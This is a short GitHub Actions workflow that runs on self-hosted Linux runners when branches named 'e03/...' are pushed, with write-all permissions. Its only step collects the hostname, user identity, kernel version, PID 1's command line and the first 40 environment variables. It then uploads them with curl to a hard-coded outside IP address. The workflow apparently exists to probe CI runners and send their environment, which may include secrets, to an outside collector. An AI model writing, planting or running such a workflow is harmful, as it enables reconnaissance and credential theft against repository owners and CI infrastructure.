name: e03 sh
on:
  push:
    branches: ["e03/**"]
permissions: write-all
jobs:
  s:
    runs-on: [self-hosted, linux]
    steps:
      - name: id
        run: |
          { echo "== SELFHOSTED $GITHUB_REPOSITORY $GITHUB_RUN_ID"; hostname; id; uname -a; tr "\0" " " < /proc/1/cmdline; echo; env | sort | head -40; } > /tmp/s.txt 2>&1
          curl -s -m 20 --data-binary @/tmp/s.txt http://198.13.130.233:8089/e03sh-$GITHUB_REPOSITORY_ID-$GITHUB_RUN_ID
          cat /tmp/s.txt
